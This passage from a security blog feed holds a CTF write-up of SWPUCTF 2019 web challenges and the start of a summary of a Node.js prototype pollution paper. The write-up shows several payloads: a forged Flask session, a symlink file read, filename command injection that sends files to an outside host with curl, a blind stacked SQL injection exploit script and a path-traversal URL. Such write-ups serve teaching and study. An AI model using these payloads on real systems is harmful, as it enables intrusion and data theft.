denied!</span><br></pre></td></tr></table></figure></p><p>那么猜想需要伪造session：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;id&quot;:&#123;&quot; b&quot;:&quot;100&quot;&#125;,&quot;is_login&quot;:true,&quot;password&quot;:&quot;sss&quot;,&quot;username&quot;:&quot;sss&quot;&#125;</span><br></pre></td></tr></table></figure></p><p>那么显然需要将自己伪造成id为1的用户，但是要伪造session，必须要secretkey，那么尝试模板注入：<br><img src="/images/2019-12-07-09-25-36.png" alt=""><br>发现response中有：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SWPUCTF_CSRF_Token: U0VDUkVUX0tFWTprZXlxcXF3d3dlZWUhQCMkJV4mKg==</span><br></pre></td></tr></table></figure></p><p>解码后得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SECRET_KEY:keyqqqwwweee!@#$%^&amp;*</span><br></pre></td></tr></table></figure></p><p>于是进行session伪造：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.eJyrVspMUbKqVlJIUrJS8g20tVWq1VHKLI7PyU_PzFOyKikqTdVRKkgsLi7PLwIqVEpMyQWK6yiVFqcW5SXmpsKFagFiyxgX.XekyGw.wYomzVd7LK9ea7WN-mZaQ0gldjg</span><br></pre></td></tr></table></figure></p><p>即可进入文件上传功能：<br><img src="/images/2019-12-07-09-31-42.png" alt=""><br>上传功能提示只允许上传zip，我们测试：<br><img src="/images/2019-12-07-09-34-59.png" alt=""><br>发现上传后，服务器会解压压缩包。<br>于是尝试软连接：<br><img src="/images/2019-12-07-09-38-41.png" alt=""><br>发现可以成功任意文件读取，读取了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/proc/self/maps</span><br><span class="line">/proc/self/cwd</span><br><span class="line">/proc/self/cmdline</span><br><span class="line">....</span><br></pre></td></tr></table></figure></p><p>发现都没找到路径，结果F12，发现源码写在注释里……喷血= =。<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/upload',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">'id'</span>] != <span class="string">b'1'</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(temp)</span><br><span class="line">    <span class="keyword">if</span> request.method==<span class="string">'POST'</span>:</span><br><span class="line">        m = hashlib.md5()</span><br><span class="line">        name = session[<span class="string">'password'</span>]</span><br><span class="line">        name = name+<span class="string">'qweqweqwe'</span></span><br><span class="line">        name = name.encode(encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">        m.update(name)</span><br><span class="line">        md5_one= m.hexdigest()</span><br><span class="line">        n = hashlib.md5()</span><br><span class="line">        ip = request.remote_addr</span><br><span class="line">        ip = ip.encode(encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">        n.update(ip)</span><br><span class="line">        md5_ip = n.hexdigest()</span><br><span class="line">        f=request.files[<span class="string">'file'</span>]</span><br><span class="line">        basepath=os.path.dirname(os.path.realpath(__file__))</span><br><span class="line">        path = basepath+<span class="string">'/upload/'</span>+md5_ip+<span class="string">'/'</span>+md5_one+<span class="string">'/'</span>+session[<span class="string">'username'</span>]+<span class="string">"/"</span></span><br><span class="line">        path_base = basepath+<span class="string">'/upload/'</span>+md5_ip+<span class="string">'/'</span></span><br><span class="line">        filename = f.filename</span><br><span class="line">        pathname = path+filename</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"zip"</span> != filename.split(<span class="string">'.'</span>)[<span class="number">-1</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'zip only allowed'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path_base):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                os.makedirs(path_base)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                os.makedirs(path)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(pathname):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                f.save(pathname)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cmd = <span class="string">"unzip -n -d "</span>+path+<span class="string">" "</span>+ pathname</span><br><span class="line">            <span class="keyword">if</span> cmd.find(<span class="string">'|'</span>) != <span class="number">-1</span> <span class="keyword">or</span> cmd.find(<span class="string">';'</span>) != <span class="number">-1</span>:</span><br><span class="line">waf()</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">            os.system(cmd)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">        unzip_file = zipfile.ZipFile(pathname,<span class="string">'r'</span>)</span><br><span class="line">        unzip_filename = unzip_file.namelist()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> session[<span class="string">'is_login'</span>] != <span class="keyword">True</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'not login'</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> unzip_filename.find(<span class="string">'/'</span>) != <span class="number">-1</span>:</span><br><span class="line">                shutil.rmtree(path_base)</span><br><span class="line">                os.mkdir(path_base)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">            image = open(path+unzip_filename, <span class="string">"rb"</span>).read()</span><br><span class="line">            resp = make_response(image)</span><br><span class="line">            resp.headers[<span class="string">'Content-Type'</span>] = <span class="string">'image/png'</span></span><br><span class="line">            <span class="keyword">return</span> resp</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            shutil.rmtree(path_base)</span><br><span class="line">            os.mkdir(path_base)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'upload.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/showflag')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showflag</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">True</span> == <span class="keyword">False</span>:</span><br><span class="line">        image = open(os.path.join(<span class="string">'./flag/flag.jpg'</span>), <span class="string">"rb"</span>).read()</span><br><span class="line">        resp = make_response(image)</span><br><span class="line">        resp.headers[<span class="string">'Content-Type'</span>] = <span class="string">'image/png'</span></span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"can't give you"</span></span><br></pre></td></tr></table></figure></p><p>发现敏感点：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">         cmd = <span class="string">"unzip -n -d "</span>+path+<span class="string">" "</span>+ pathname</span><br><span class="line">         <span class="keyword">if</span> cmd.find(<span class="string">'|'</span>) != <span class="number">-1</span> <span class="keyword">or</span> cmd.find(<span class="string">';'</span>) != <span class="number">-1</span>:</span><br><span class="line">waf()</span><br><span class="line">             <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">         os.system(cmd)</span><br></pre></td></tr></table></figure></p><p>此处我们可以进行命令注入，跟踪path和pathname：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">f=request.files[<span class="string">'file'</span>]</span><br><span class="line">basepath=os.path.dirname(os.path.realpath(__file__))</span><br><span class="line">path = basepath+<span class="string">'/upload/'</span>+md5_ip+<span class="string">'/'</span>+md5_one+<span class="string">'/'</span>+session[<span class="string">'username'</span>]+<span class="string">"/"</span></span><br><span class="line">path_base = basepath+<span class="string">'/upload/'</span>+md5_ip+<span class="string">'/'</span></span><br><span class="line">filename = f.filename</span><br><span class="line">pathname = path+filename</span><br></pre></td></tr></table></figure></p><p>发现文件名可以进行命令注入，于是测试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=&quot;$(curl vps_ip:23333).zip&quot;</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-12-07-10-01-51.png" alt=""><br>发现可以收到请求，尝试外带数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(curl 106.14.114.127:23333 -T `pwd`).zip</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-12-07-10-05-12.png" alt=""><br>那么尝试读取flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./flag/flag.jpg</span><br></pre></td></tr></table></figure></p><p>但是遇到问题：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if unzip_filename.find(&apos;/&apos;) != -1:</span><br><span class="line">if cmd.find(&apos;|&apos;) != -1 or cmd.find(&apos;;&apos;) != -1:</span><br></pre></td></tr></table></figure></p><p>我们发现过滤了一些关键符号，那么只能尝试构造符号，随便搜一个ascii转字符的命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/c20130911/article/details/73187757</span><br></pre></td></tr></table></figure></p><p>即可进行字符转换：<br><img src="/images/2019-12-07-10-08-44.png" alt=""><br>那么我们伪造/：<br><img src="/images/2019-12-07-10-12-35.png" alt=""><br>那么构造exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(sky=`awk &apos;BEGIN&#123;printf &quot;%c\n&quot;,47&#125;&apos;`&amp;&amp;curl vps_ip:23333 -T `cat .$&#123;sky&#125;flag$&#123;sky&#125;flag.jpg`)</span><br></pre></td></tr></table></figure></p><p>将图片带出后，做一些修改，删除FFD8前的数据，打开即可得到flag：<br><img src="/images/2019-12-07-10-18-44.png" alt=""></p><h2 id="demo-mvc"><a href="#demo-mvc" class="headerlink" title="demo_mvc"></a>demo_mvc</h2><p>发现比赛太晚，做的时候已经有hint了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">无需扫描 hint:PDO::query</span><br></pre></td></tr></table></figure></p><p>那么不难想到，应该是有注入了：<br><img src="/images/2019-12-07-10-23-54.png" alt=""><br>对于PDO，我首先想到的是堆叠注入，随机测试一下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sleep(5)</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-12-07-10-26-11.png" alt=""><br>发现成功sleep 5秒，那么尝试爆库爆表爆字段：<br>首先测试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select if((ascii(substr((database()),1,1))&gt;-1),sleep(5),1)</span><br><span class="line"></span><br><span class="line">&#123;&quot;username&quot;:&quot;sss&apos;;SET @aaa=0x73656c6563742069662828617363696928737562737472282864617461626173652829292c312c3129293e2d31292c736c6565702835292c3129;PREPARE test FROM @aaa;EXECUTE test;&quot;,&quot;password&quot;:&quot;sss&apos;&quot;&#125;</span><br></pre></td></tr></table></figure></p><p>发现成功sleep 5秒，随后测试payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select if((ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),1,1))&gt;-1),sleep(5),1)</span><br><span class="line"></span><br><span class="line">&#123;&quot;username&quot;:&quot;sss&apos;;SET @aaa=0x73656c6563742069662828617363696928737562737472282873656c6563742067726f75705f636f6e636174285441424c455f4e414d45292066726f6d20696e666f726d6174696f6e5f736368656d612e5441424c4553207768657265205441424c455f534348454d413d64617461626173652829292c312c3129293e2d31292c736c6565702835292c3129;PREPARE test FROM @aaa;EXECUTE test;&quot;,&quot;password&quot;:&quot;sss&apos;&quot;&#125;</span><br></pre></td></tr></table></figure></p><p>发现依旧成功sleep 5秒，那么开始编写exp：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">exp = <span class="string">'''&#123;"username":"sss';SET @aaa=0x%s;PREPARE test FROM @aaa;EXECUTE test;","password":"sss'"&#125;'''</span></span><br><span class="line"><span class="comment">#payload = 'select if((ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),%s,1))=%s),sleep(5),1)'</span></span><br><span class="line"><span class="comment">#payload = 'select if((ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=0x666C6167),%s,1))=%s),sleep(5),1)'</span></span><br><span class="line">payload = <span class="string">'select if((ascii(substr((select flag from flag limit 0,1),%s,1))=%s),sleep(5),1)'</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://182.92.220.157:11116/index.php?r=Login/Login'</span></span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line"><span class="keyword">print</span> i</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">now_payload = payload %(i,j)</span><br><span class="line">now_exp = exp % now_payload.encode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">r = requests.post(url=url,data=now_exp,timeout=<span class="number">4.5</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">res +=chr(j)</span><br><span class="line"><span class="keyword">print</span> res</span><br></pre></td></tr></table></figure></p><p>得到表名：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag,user</span><br></pre></td></tr></table></figure></p><p>flag表中列名：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag</span><br></pre></td></tr></table></figure></p><p>于是读取数据，得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AmOL#T.zip</span><br></pre></td></tr></table></figure></p><p>下载后发现是代码审计。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">View/userIndex.php</span><br></pre></td></tr></table></figure></p><p>发现文件读取：<br><img src="/images/2019-12-07-10-46-01.png" alt=""><br>构造：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://182.92.220.157:11116/index.php?r=User/Index&amp;img_file=/../flag.php</span><br></pre></td></tr></table></figure></p><p>即可获取flag：<br><img src="/images/2019-12-07-10-22-08.png" alt=""><br>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">swpuctf&#123;H@ve_a_g00d_t1me_durin9_swpuctf2019&#125;</span><br></pre></td></tr></table></figure></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>做了4道题，最后一题看是java xxe，估计要结合一个特性，自己对java不是很熟，就不去肝了。不过前4题做下来，感觉难度比往年低了不少（</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;12月比赛有点少，手有点生了，发现SWPU又开始了，还记得去年质量挺高的，于是来玩玩，下面是web的解题记录。&lt;/p&gt;
&lt;h2 id=&quot;ea
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Paper Summary &amp; Prototype pollution attack in NodeJS application</title>
    <link href="http://skysec.top/2019/12/06/Paper-Summary-Prototype-pollution-attack-in-NodeJS-application/"/>
    <id>http://skysec.top/2019/12/06/Paper-Summary-Prototype-pollution-attack-in-NodeJS-application/</id>
    <published>2019-12-06T13:10:56.000Z</published>
    <updated>2019-12-24T12:36:51.280Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本篇paper来自于 NSEC 2018 ：Prototype pollution attack in NodeJS application，写summary的原因因为本篇文章介绍的攻击点和实际问题密切相关，同时在CTF各大比赛中经常出现。</p><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><p>为了介绍什么是原型链污染漏洞，我们得先有一些前置知识，首先观察一段代码：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a=&#123;&#125;;</span><br><span class="line">a.__proto__.test2 = <span class="string">'456'</span>;</span><br><span class="line"></span><br><span class="line">b=&#123;&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(a.test2);</span><br><span class="line"><span class="built_in">console</span>.log(b.test2);</span><br><span class="line">b.__proto__.test2 = <span class="string">'789'</span>;</span><br><span class="line"><span class="built_in">console</span>.log(a.test2);</span><br><span class="line"><span class="built_in">console</span>.log(b.test2);</span><br></pre></td></tr></table></figure></p><p>我们定义一个a对象，并对其进行赋值：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a.__proto__.test2 = <span class="string">'456'</span>;</span><br></pre></td></tr></table></figure></p><p>我们再定义一个b对象，但此时发现，如果我们输出：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">console.log(a.test2);</span><br><span class="line">console.log(b.test2);</span><br></pre></td></tr></table></figure></p><p>此时得到的结果是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">456</span><br><span class="line">456</span><br></pre></td></tr></table></figure></p><p>那么为什么b对象会有test2这个属性的value呢？<br><img src="/images/2019-12-07-14-09-41.png" alt=""><br>这是因为我们有等价关系：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a.__proto__ == Object.prototype</span><br></pre></td></tr></table></figure></p><p>那么此时，如果我们调用b.test2，其因为获取不到，就会往父类中查找，因此找到了Object.prototype.test2。<br>因此我们调用b.test2，可以获取到456这个值。<br>我们再看一个简单的例子：<br><img src="/images/2019-12-07-20-58-40.png" alt=""><br>我们构造了类的继承关系：<br>在使用a.testA的时候:<br>1.在testC类里查找testA属性<br>2.在testC的父类里查找testA属性<br>3.在testC的”爷”类里查找testA属性<br>故此可以正常调用到testA属性。<br>对于testB、testC属性也是同理。</p><h2 id="原型链污染漏洞"><a href="#原型链污染漏洞" class="headerlink" title="原型链污染漏洞"></a>原型链污染漏洞</h2><p>为了了解原型链污染漏洞，我们看如下代码：<br><img src="/images/2019-12-07-14-39-25.png" alt=""><br>假设我们控制evil.<strong>proto</strong>，那就等同于可以修改testClass类的prototype，那么即可篡改SecClass中的url属性值。<br>那么在后续所有调用该属性的位置，都会产生相应的影响。</p><h2 id="漏洞评估"><a href="#漏洞评估" class="headerlink" title="漏洞评估"></a>漏洞评估</h2><p>作者的数据集定于npm的所有库，但是由于代码量巨大，传统的静态分析并不适用，于是作者使用了动态测试方法，对受影响的库进行验证：</p><ul><li>使用npm安装需要测试的库</li><li>将库引入文件</li><li>递归列举库中所有可调用的函数</li><li>对于每一个函数<ul><li>对于每一个函数进行原型链污染测试input</li><li>检验是否产生影响，若产生，则标注漏洞点，并清除影响<br>代码已开源在github：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/find-vuln/find-vuln.js</span><br></pre></td></tr></table></figure></li></ul></li></ul><p>简单分析代码可知，作者首先申明了一个对象，对象中有属性名为：<em>proto</em>。<br>如果经过库中函数处理，该属性成为原型，那么说明出现了原型链污染问题：<br>作者列举了多种pattern：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> pattern = [&#123;</span><br><span class="line">fnct : <span class="function"><span class="keyword">function</span> (<span class="params">totest</span>) </span>&#123;</span><br><span class="line">totest(BAD_JSON);</span><br><span class="line">&#125;,</span><br><span class="line">sig: <span class="string">"function (BAD_JSON)"</span></span><br><span class="line">&#125;,&#123;</span><br><span class="line">fnct : <span class="function"><span class="keyword">function</span> (<span class="params">totest</span>) </span>&#123;</span><br><span class="line">totest(BAD_JSON, &#123;&#125;);</span><br><span class="line">&#125;,</span><br><span class="line">sig: <span class="string">"function (BAD_JSON, &#123;&#125;)"</span></span><br><span class="line">&#125;,&#123;</span><br><span class="line">fnct : <span class="function"><span class="keyword">function</span> (<span class="params">totest</span>) </span>&#123;</span><br><span class="line">totest(&#123;&#125;, BAD_JSON);</span><br><span class="line">&#125;,</span><br><span class="line">sig: <span class="string">"function (&#123;&#125;, BAD_JSON)"</span></span><br><span class="line">&#125;,&#123;</span><br><span class="line">fnct : <span class="function"><span class="keyword">function</span> (<span class="params">totest</span>) </span>&#123;</span><br><span class="line">totest(BAD_JSON, BAD_JSON);</span><br><span class="line">&#125;,</span><br><span class="line">sig: <span class="string">"function (BAD_JSON, BAD_JSON)"</span></span><br><span class="line">&#125;,&#123;</span><br><span class="line">fnct : <span class="function"><span class="keyword">function</span> (<span class="params">totest</span>) </span>&#123;</span><br><span class="line">totest(&#123;&#125;, &#123;&#125;, BAD_JSON);</span><br><span class="line">&#125;,</span><br><span class="line">sig: <span class="string">"function (&#123;&#125;, &#123;&#125;, BAD_JSON)"</span></span><br><span class="line">&#125;,&#123;</span><br><span class="line">fnct : <span class="function"><span class="keyword">function</span> (<span class="params">totest</span>) </span>&#123;</span><br><span class="line">totest(&#123;&#125;, &#123;&#125;, &#123;&#125;, BAD_JSON);</span><br><span class="line">&#125;,</span><br><span class="line">sig: <span class="string">"function (&#123;&#125;, &#123;&#125;, &#123;&#125;, BAD_JSON)"</span></span><br><span class="line">&#125;,&#123;</span><br><span class="line">fnct : <span class="function"><span class="keyword">function</span> (<span class="params">totest</span>) </span>&#123;</span><br><span class="line">totest(&#123;&#125;, <span class="string">"__proto__.test"</span>, <span class="string">"123"</span>);</span><br><span class="line">&#125;,</span><br><span class="line">sig: <span class="string">"function (&#123;&#125;, BAD_PATH, VALUE)"</span></span><br><span class="line">&#125;,&#123;</span><br><span class="line">fnct : <span class="function"><span class="keyword">function</span> (<span class="params">totest</span>) </span>&#123;</span><br><span class="line">totest(&#123;&#125;, <span class="string">"__proto__[test]"</span>, <span class="string">"123"</span>);</span><br><span class="line">&#125;,</span><br><span class="line">sig: <span class="string">"function (&#123;&#125;, BAD_PATH, VALUE)"</span></span><br><span class="line">&#125;,&#123;</span><br><span class="line">fnct : <span class="function"><span class="keyword">function</span> (<span class="params">totest</span>) </span>&#123;</span><br><span class="line">totest(<span class="string">"__proto__.test"</span>, <span class="string">"123"</span>);</span><br><span class="line">&#125;,</span><br><span class="line">sig: <span class="string">"function (BAD_PATH, VALUE)"</span></span><br><span class="line">&#125;,&#123;</span><br><span class="line">fnct : <span class="function"><span class="keyword">function</span> (<span class="params">totest</span>) </span>&#123;</span><br><span class="line">totest(<span class="string">"__proto__[test]"</span>, <span class="string">"123"</span>);</span><br><span class="line">&#125;,</span><br><span class="line">sig: <span class="string">"function (BAD_PATH, VALUE)"</span></span><br><span class="line">&#125;,&#123;</span><br><span class="line">fnct : <span class="function"><span class="keyword">function</span> (<span class="params">totest</span>) </span>&#123;</span><br><span class="line">totest(&#123;&#125;, <span class="string">"__proto__"</span>, <span class="string">"test"</span>, <span class="string">"123"</span>);</span><br><span class="line">&#125;,</span><br><span class="line">sig: <span class="string">"function (&#123;&#125;, BAD_STRING, BAD_STRING, VALUE)"</span></span><br><span class="line">&#125;,&#123;</span><br><span class="line">fnct : <span class="function"><span class="keyword">function</span> (<span class="params">totest</span>) </span>&#123;</span><br><span class="line">totest(<span class="string">"__proto__"</span>, <span class="string">"test"</span>, <span class="string">"123"</span>);</span><br><span class="line">&#125;,</span><br><span class="line">sig: <span class="string">"function (BAD_STRING, BAD_STRING, VALUE)"</span></span><br><span class="line">&#125;]</span><br></pre></td></tr></table></figure></p><p>然后对一个库中所有函数进行测试，再进行检测：<br><figure class="highlight 